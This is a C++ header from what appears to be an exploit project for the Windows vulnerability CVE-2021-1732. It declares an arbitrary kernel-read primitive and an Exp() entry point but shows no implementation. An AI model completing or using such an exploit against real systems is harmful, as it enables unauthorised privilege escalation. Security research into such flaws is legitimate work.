#pragma once
#define WIN32_LEAN_AND_MEAN
#include "include/core/def.hpp"
#include "include/utils/gadget.hpp"
#include "include/common/gadget.hpp"
#include "include/common/memtools.hpp"
#include "include/describe/vuln_description.hpp"
#include <vector>
#include <tlhelp32.h>

inline constexpr ULONG_PTR ring3Addr = 0x94000000;
namespace CVE_2021_1732
{
    void arbitryRead0x10Size(ULONG_PTR pAddr, ULONG_PTR& valLow, ULONG_PTR& valHigh);
    bool Exp();
} // namespace CVE_2021_1732